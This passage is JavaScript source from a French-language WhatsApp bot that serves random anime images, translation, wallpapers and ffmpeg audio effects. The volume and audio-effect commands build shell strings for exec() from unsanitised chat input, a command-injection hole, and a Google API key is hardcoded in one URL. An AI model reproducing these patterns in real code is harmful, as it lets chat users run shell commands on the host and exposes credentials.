                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'indo':{
await KevStickWait()
var notnot = JSON.parse(fs.readFileSync('./recherche/media/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
			case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'meow':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
			case 'wallhp': case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu2': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
await KevStickWait()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\n_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: yeha}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
			case 'traduction':{
  	if (!q) return replygckev(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
  	const defaultLang = 'fr'
const tld = 'cn'
    let err = `
 *Exemple:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *Liste des languages pris en compte:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: result.text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🍁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
    } catch (e) {
        return replygckev(err)
    } 
    }
    break
            case 'wallpaper': {
                if (!text) return replygckev('Veuillez Entrer Le Titre ')
                await KevStickWait()
		let { wallpaper } = require('./bibliotheque/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]       
         let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\n_*Voici le resultat de ${text}*_\n\n${themeemoji} Titre : ${result.title}\n${themeemoji} Categorie : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image[0]}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command} ${text}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                
            }
            break
            case 'wikimedia': {
                if (!text) return replygckev('Veuillez Entrer Le Titre ')
                await KevStickWait()
		let { wikimedia } = require('./bibliotheque/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\n_*Voici le resultat de ${text}*_\n\n${themeemoji} Titre : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command} ${text}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                
            }
            break
    case 'esthetique':{
await KevStickWait()
var notnot = JSON.parse(fs.readFileSync('./recherche/media/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
			case 'ebinary': {
if (!q) return replygckev(`Veuillez repondre a une image ${prefix + command}`)
let { eBinary } = require('./bibliotheque/binary')
let eb = await eBinary(`${q}`)
replygckev(eb)
}
break
case 'dbinary': {
if (!q) return replygckev(`Veuillez repondre a une image ${prefix + command}`)
let { dBinary } = require('./bibliotheque/binary')
let db = await dBinary(`${q}`)
replygckev(db)
}
break
			  case 'vol-audio': {
if (!args.join(" ")) return replygckev(`Exemple: ${prefix + command} 10`)
media = await Kev.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygckev('Error!')
jadie = fs.readFileSync(rname)
Kev.sendMessage(m.chat, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
case 'vol-video': {
if (!args.join(" ")) return replygckev(`Exemple: ${prefix + command} 10`)
media = await Kev.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygckev('Erreur!')
jadie = fs.readFileSync(rname)
Kev.sendMessage(m.chat, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
			case 'emoji-mix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replygckev(`Exemple : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replygckev(`Exemple : ${prefix + command} 😅+🤔`)
                await KevStickWait()
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await Kev.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
			case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                await KevStickWait()
                let media = await Kev.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return replygckev(err)
                let buff = fs.readFileSync(ran)
                Kev.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else replygckev(`Veyillez repondre a un audio *${prefix + command}*`)
                } catch (e) {
                replygckev(e)
                }
                break
			case 'vue-unique':
            case 'en-vueunique': {
                if (!m.quoted) return replygckev(`Veuillez Repondre A Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await Kev.downloadAndSaveMediaMessage(quoted)
                    Kev.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: mess.done,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await Kev.downloadAndSaveMediaMessage(quoted)
                    Kev.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: mess.done,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/audio/.test(mime)) {
                   bebasap = await Kev.downloadAndSaveMediaMessage(quoted)
                   Kev.sendMessage(m.chat, {
                     audio: {
                        url: bebasap
                     },
                     mimetype: 'audio/mpeg',
                     ptt: true,
                     viewOnce: true
                   })
                }
            }
            break
			case 'fliptexte': {
                if (args.length < 1) return replygckev(`Exemple:\n${prefix}fliptext Neidy`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replygckev(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
			case 'style': case 'styletext': {
		if (!text) return replygckev('Veuillez Entrer Un Texte!')
                let anu = await styletext(text)
                let teks = `Style Texte De ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                replygckev(teks)
	    }
	    break
			case 'obfus': case 'obfusquer':{
if (!text) return replygckev(`Exemple ${prefix+command} const sylversbot = require('baileys')`)
try {
let meg = await obfus(text)
replygckev(`Succes
${meg.result}`)
} catch {
	replygckev(`Veuillez utiliser proprement la commande\nExemple ${prefix+command} const sylversbot = require('baileys')`)
}
}
break
			case 'Telechargement-auto': case 'autodl':
if (!TontonKev) return KevStickOwner()
                
                if (q == 'on') {
                    db.settings[botNumber].autodownload = true
                    replygckev(`Activer ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].autodownload = false
                    replygckev(`Desactiver ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
